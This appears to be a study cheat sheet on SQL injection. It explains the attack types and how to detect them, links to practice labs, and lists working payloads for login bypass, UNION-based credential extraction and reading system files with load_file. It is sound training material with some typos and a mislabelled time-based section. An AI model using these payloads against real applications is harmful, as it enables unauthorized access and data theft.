# SQL Injection

* Vulnerability that consists of an attacker interfering with the SQL queries that an application makes to a database.

## Impact of SQL Injection Attacks

* Unauthorized access to sensitive data
	
	* Confidentiality - SQLi can be used to viwe sensitive information, such as application username and passwords
	* Integirity - SQLi can be used to alter data in the database
	* Availability - SQLi can be used to delete data in the database

## Types of SQL Injection
	
	* In-Band(classic)
		* Error
		* Union
	* Inferential(Blind)
		* Boolean
		* Time
	* Out-of-Bnad

### Error-Based SQLi 

	Example:
			Request:
			www.target.com/app.php?id='

			Response:	
			You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version ...

### Union-Based SQLi 

	Example:
			Request:
			www.target.com/app.php?id=' UNION SELECT username, password FROM users--

			Response:	
			administrator
			carlos

### Boolean-Based SQLi 

	Example:
			Request:
			www.target.com/app.php?id=1 and 1=2

			Response:	
			False

			Request:
			www.target.com/app.php?id=1 and 1=1

			Response:	
			True

### Boolean-Based SQLi 

	Example:
			If the first character of the admin's hashed passwd is an 'a', wait for 10 seconds.
				-> response takes 10 second -> first letter is 'a'
				-> response doesn't takes 10 second -> first letter is not 'a'

### Out-of-band-Based SQLi 

	Example 

		will discuss...

## Finding  SQLi Vulnerabilities

	* Submit SQL-specific characters such as ' or ", and look errors or other anomalies
	* Submit Boolean conditons such as OR 1=1 and OR 1=2, and look for differences in the applications responcses
	* Submit Payloads designed to trigger time delays when executed within a SQL query, and look for diffrences in the time taken to respond
	* Submit OAST Payloads designed to trigger out-of-band network interaction when executed within a SQL query, and monitor for any resulting interactions

Automated Exploitation Tool

	sqlmap (https://github.com/sqlmapproject/sqlmap)

## Payloads
```
	'
	"
	)'
	)"
	')
	")
	'))
	"))
```

## Login Bypass
```
	' or 1=1 --
	' or '1'='1
	' or 1=1 --+
	admin' or 1=1;#
	admin' or 1=1 LIMIT 1;#
	admin' or 1=1 LIMIT 0,1;#
```

## Union Based SQL
```
	order by 1
	order by 2
	order by 3
	' UNION SELECT NULL --
	' UNION SELECT NULL,NULL --
	' UNION SELECT 1,2,3 -- -
	' UNION SELECT 1,load_file('/etc/password'),3 --
```

## Resources and Labs:

	https://smoggy-mozzarella-076.notion.site/SQL-d655b37898be4bf8a5c816e6a79f4e96
	https://portswigger.net/web-security/sql-injection
	https://tryhackme.com/room/sqlilab
	https://medium.com/nerd-for-tech/some-tips-for-sql-injections-764e1a254a29



